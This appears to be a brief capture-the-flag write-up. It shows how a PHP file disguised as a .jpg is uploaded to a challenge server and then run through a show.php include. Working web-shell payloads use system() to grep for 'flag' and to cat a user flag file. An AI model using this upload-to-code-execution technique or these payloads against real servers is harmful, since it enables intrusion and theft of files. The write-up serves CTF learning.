Create a file ``hermit-file.jpg`` with payload ``<?php phpinfo() ?>``

```
http --form -v POST  http://104.197.195.221:8086/upload.php fileToUpload@hermit-file.jpg
```

File has been uploaded to a file with random generate name in ``/var/www/html/uploads/``, and in response we can find the new file name. Now let's visit it

```
http -v http://104.197.195.221:8086/show.php?filename=GO6ZR6
```

Phpinfo is shown as expected.

Try to find any file contains the word ``flag``.

```
<?php system("grep -Ri flag *"); ?>
```

A long list of files come out, some of them contain the following path.

```
/home/hermit/flag/userflag.txt
```

Try to get the file content.

```
<?php system("cat /home/hermit/flag/userflag.txt"); ?>
```

In response is the flag.
